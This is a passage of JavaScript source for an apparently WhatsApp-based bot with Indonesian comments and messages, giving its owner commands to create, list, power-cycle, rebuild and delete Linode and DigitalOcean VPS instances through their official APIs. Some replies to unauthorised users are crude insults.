        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      KhaerulZx.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      KhaerulZx.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}


            

case "linode2gb": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
            
 case "linode4gb": {
 if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

            
case "saldolinode":
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(mess.owner);

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        reply(teksSaldo);
      } else {
        reply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      reply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;




        
case "resetpassword": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;



        
    case 'listlinode': {
    if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      KhaerulZx.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}
     
        
 case "offlinode": {
 if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case "onlinode": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        reply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case "rebootlinode": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang direboot...');
      } else {
        reply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}
//==================================================//
// DO
case "sisadroplet":{
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator) return reply(`Ngapain Woi Tolol Yatim`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isCreator) {
      return reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
if (banned.includes(m.sender)) {
    return;
    }
    if (!isCreator) return reply(`Idih Yatim So Asik Kontol`)
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Yatim Kontol Rese`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 KhaerulZx.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;
//

        case "deldroplet": {
        if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
case "listdroplet": {
if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      KhaerulZx.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case "cekdroplet": {
 if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      KhaerulZx.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      KhaerulZx.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case "vps1g1c": {
    if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
    if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
    if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
    if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await KhaerulZx.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
     if (banned.includes(m.sender)) {
    return;
    }
  if (!isCreator) return reply(`Khusus Finsii Saja Suki`);
    let hostname = args[0];
  if (!hostname) return reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
